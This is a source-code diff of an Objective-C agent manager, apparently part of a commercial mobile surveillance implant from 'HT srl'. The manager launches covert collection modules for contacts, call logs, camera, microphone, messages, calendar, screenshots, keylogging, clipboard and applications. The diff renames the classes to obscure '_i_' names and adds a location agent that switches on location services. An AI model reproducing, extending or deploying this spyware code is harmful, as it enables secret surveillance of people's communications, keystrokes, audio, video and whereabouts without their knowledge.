@@ -6,6 +6,8 @@
 //  Copyright 2012 HT srl. All rights reserved.
 //
 #import <mach/mach.h>
+#import <CoreLocation/CoreLocation.h>
+#import <objc/runtime.h>
 
 #import "RCSIAgentManager.h"
 #import "RCSICommon.h"
@@ -23,10 +25,11 @@
 #import "RCSIAgentMicrophone.h"
 #import "RCSIAgentScreenshot.h"
 #import "RCSIAgentURL.h"
+#import "RCSIAgentPositionSupport.h"
 
 NSString *kRunLoopAgentManagerMode = @"kRunLoopAgentManagerMode";
 
-@implementation RCSIAgentManager
+@implementation _i_AgentManager
 
 @synthesize notificationPort;
 
@@ -69,6 +72,8 @@ NSString *kRunLoopAgentManagerMode = @"kRunLoopAgentManagerMode";
   [super dealloc];
 }
 
+
+
 #pragma mark -
 #pragma mark Main runloop
 #pragma mark -
@@ -89,7 +94,7 @@ typedef struct _coreMessage_t
   NSData *msgData = [[NSData alloc] initWithBytes: &params 
                                            length: sizeof(shMemoryLog)];
   
-  [RCSISharedMemory sendMessageToCoreMachPort: msgData 
+  [_i_SharedMemory sendMessageToCoreMachPort: msgData 
                                      withMode: kRunLoopAgentManagerMode];
   
   [msgData release];
@@ -144,17 +149,26 @@ typedef struct _coreMessage_t
   if (agentInstance == nil)
     return;
   
-  time_t tmpCfgId = [[RCSIConfManager sharedInstance] mConfigTimestamp];
+  /*
+   * check if we can run  position remote agents
+   */
+  if (agentID == AGENT_POSITION)
+  {
+    UInt32 *flag = (UInt32*)[[agentInstance mAgentConfiguration] bytes];
+    [[_i_AgentPositionSupport sharedInstance] checkAndSetupLocationServices: flag];
+  }
+  
+  time_t tmpCfgId = [[_i_ConfManager sharedInstance] mConfigTimestamp];
                      
-  RCSIDylibBlob *tmpBlob 
-     = [[RCSIDylibBlob alloc] initWithType:agentID 
+  _i_DylibBlob *tmpBlob 
+     = [[_i_DylibBlob alloc] initWithType:agentID 
                                     status:1 
                                 attributes:DYLIB_AGENT_START_ATTRIB 
                                       blob:[agentInstance mAgentConfiguration]
                                   configId:tmpCfgId];
   
-  [[RCSISharedMemory sharedInstance] putBlob: tmpBlob];
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
   [tmpBlob release];
 }
@@ -166,15 +180,15 @@ typedef struct _coreMessage_t
   if (agentInstance == nil)
     return;
   
-  RCSIDylibBlob *tmpBlob 
-  = [[RCSIDylibBlob alloc] initWithType:agentID 
+  _i_DylibBlob *tmpBlob 
+  = [[_i_DylibBlob alloc] initWithType:agentID 
                                   status:1 
                               attributes:DYLIB_AGENT_STOP_ATTRIB 
                                     blob:[agentInstance mAgentConfiguration]
-                                configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
+                                configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
   
-  [[RCSISharedMemory sharedInstance] putBlob: tmpBlob];  
-  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];  
+  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
   [tmpBlob release];
 }
@@ -184,7 +198,7 @@ typedef struct _coreMessage_t
   if ([agentInstance mAgentStatus] != AGENT_STATUS_STOPPED)
     return;
   
-  RCSIThread *agentThread = [[RCSIThread alloc] 
+  _i_Thread *agentThread = [[_i_Thread alloc] 
                                   initWithTarget: agentInstance
                                         selector: @selector(startAgent) 
                                           object: nil
@@ -353,71 +367,78 @@ typedef struct _coreMessage_t
   {
     case AGENT_ADDRESSBOOK:
     {
-      agentInstance = [[RCSIAgentAddressBook alloc] initWithConfigData: aData];
+      agentInstance = [[_i_AgentAddressBook alloc] initWithConfigData: aData];
       break;
     }
     case AGENT_CALL_LIST:
     {
-      agentInstance = [[RCSIAgentCallList alloc] initWithConfigData: aData];
+      agentInstance = [[_i_AgentCallList alloc] initWithConfigData: aData];
       break;
     }
     case AGENT_CAM:
     {
-      agentInstance = [[RCSIAgentCamera alloc] initWithConfigData: aData];
+      agentInstance = [[_i_AgentCamera alloc] initWithConfigData: aData];
       break;
     }
     case AGENT_DEVICE:
     {
-      agentInstance = [[RCSIAgentDevice alloc] initWithConfigData: aData];
+      agentInstance = [[_i_AgentDevice alloc] initWithConfigData: aData];
       break;
     }
     case AGENT_MESSAGES:
     {
-      agentInstance = [[RCSIAgentMessages alloc] initWithConfigData: aData];
+      agentInstance = [[_i_AgentMessages alloc] initWithConfigData: aData];
       break;
     }
     case AGENT_MICROPHONE:
     {
-      agentInstance = [[RCSIAgentMicrophone alloc] initWithConfigData: aData];
+      agentInstance = [[_i_AgentMicrophone alloc] initWithConfigData: aData];
       break;
     }
     case AGENT_ORGANIZER:
     {
-      agentInstance = [[RCSIAgentCalendar alloc] initWithConfigData: aData];
+      agentInstance = [[_i_AgentCalendar alloc] initWithConfigData: aData];
       break;
     }
     case AGENT_SCREENSHOT:
     {
       // remote agent
-      agentInstance = [[RCSIAgent alloc] initWithConfigData:nil];
+      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
       [agentInstance setMAgentID: type];
       break;
     }
     case AGENT_URL:
     {
       // remote agent
-      agentInstance = [[RCSIAgent alloc] initWithConfigData:nil];
+      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
       [agentInstance setMAgentID: type];
       break;
     }
     case AGENT_KEYLOG:
     {
       // remote agent
-      agentInstance = [[RCSIAgent alloc] initWithConfigData:nil];
+      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
       [agentInstance setMAgentID: type];
       break;
     }
     case AGENT_CLIPBOARD:
     {
       // remote agent
-      agentInstance = [[RCSIAgent alloc] initWithConfigData:nil];
+      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
       [agentInstance setMAgentID: type];
       break;
     }
     case AGENT_APPLICATION:
     {
       // remote agent
-      agentInstance = [[RCSIAgent alloc] initWithConfigData:nil];
+      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
+      [agentInstance setMAgentID: type];
+      break;
+    }
+    case AGENT_POSITION:
+    {
+      // remote agent
+      agentInstance = [[_i_Agent alloc] initWithConfigData:aData];
       [agentInstance setMAgentID: type];
       break;
     }
@@ -447,7 +468,7 @@ typedef struct _coreMessage_t
 
 - (BOOL)start
 {  
-  NSArray *agentsConfig = [[RCSIConfManager sharedInstance] agentsArrayConfig];
+  NSArray *agentsConfig = [[_i_ConfManager sharedInstance] agentsArrayConfig];
   
   if (agentsConfig == nil)
     return FALSE;
